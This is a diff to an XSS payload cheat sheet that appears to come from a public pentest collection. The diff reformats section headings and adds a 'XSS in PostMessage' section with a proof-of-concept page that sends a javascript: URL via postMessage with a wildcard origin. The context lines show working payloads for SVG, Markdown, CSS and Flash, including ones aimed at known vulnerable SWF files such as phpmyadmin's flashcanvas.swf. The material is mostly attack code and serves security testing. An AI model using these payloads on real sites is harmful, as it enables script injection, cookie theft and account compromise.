@@ -13,6 +13,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
 - [XSS in HTML/Applications](#xss-in-htmlapplications)
 - [XSS in wrappers javascript and data URI](#xss-in-wrappers-javascript-and-data-uri)
 - [XSS in files (XML/SVG/CSS/Flash/Markdown)](#xss-in-files)
+- [XSS in PostMessage](#xss-in-postmessage)
 - [Blind XSS](#blind-xss)
   - [XSS Hunter](#xss-hunter)
   - [Other Blind XSS tools](#other-blind-xss-tools)
@@ -262,7 +263,7 @@ vbscript:msgbox("XSS")
 </name>
 ```
 
-XSS in XML
+### XSS in XML
 
 ```xml
 <html>
@@ -273,7 +274,7 @@ XSS in XML
 </html>
 ```
 
-XSS in SVG
+### XSS in SVG
 
 ```xml
 <?xml version="1.0" standalone="no"?>
@@ -287,7 +288,7 @@ XSS in SVG
 </svg>
 ```
 
-XSS in SVG (short)
+### XSS in SVG (short)
 
 ```javascript
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
@@ -297,7 +298,7 @@ XSS in SVG (short)
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
 ```
 
-XSS in Markdown
+### XSS in Markdown
 
 ```csharp
 [a](javascript:prompt(document.cookie))
@@ -306,7 +307,7 @@ XSS in Markdown
 [a](javascript:window.onerror=alert;throw%201)
 ```
 
-XSS in SWF flash application
+### XSS in SWF flash application
 
 ```powershell
 Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
@@ -316,7 +317,7 @@ IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvali
 
 more payloads in ./files
 
-XSS in SWF flash application
+### XSS in SWF flash application
 
 ```
 flashmediaelement.swf?jsinitfunctio%gn=alert`1`
@@ -337,7 +338,7 @@ flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
 phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
 ```
 
-XSS in CSS
+### XSS in CSS
 
 ```html
 <!DOCTYPE html>
@@ -353,6 +354,33 @@ div  {
   <body>
     <div>lol</div>
   </body>
+</html>
+```
+
+## XSS in PostMessage
+
+> If the target origin is asterisk * the message can be sent to any domain has reference to the child page.
+
+```html
+<html>
+<body>
+    <input type=button value="Click Me" id="btn">
+</body>
+
+<script>
+document.getElementById('btn').onclick = function(e){
+    window.poc = window.open('http://www.redacted.com/#login');
+    setTimeout(function(){
+        window.poc.postMessage(
+            {
+                "sender": "accounts",
+                "url": "javascript:confirm('XSS')",
+            },
+            '*'
+        );
+    }, 2000);
+}
+</script>
 </html>
 ```
 
@@ -1002,6 +1030,7 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [How I found a $5,000 Google Maps XSS (by fiddling with Protobuf)](https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff#.cktt61q9g) by Marin MoulinierFollow
 - [Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/) by Brett 
 - [XSSI, Client Side Brute Force](http://blog.intothesymmetry.com/2017/05/cross-origin-brute-forcing-of-saml-and.html)  
+- [postMessage XSS on a million sites - December 15, 2016 - Mathias Karlsson](https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/)
 - [postMessage XSS Bypass](https://hackerone.com/reports/231053)
 - [XSS in Uber via Cookie](http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/) by zhchbin
 - [Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) by frans
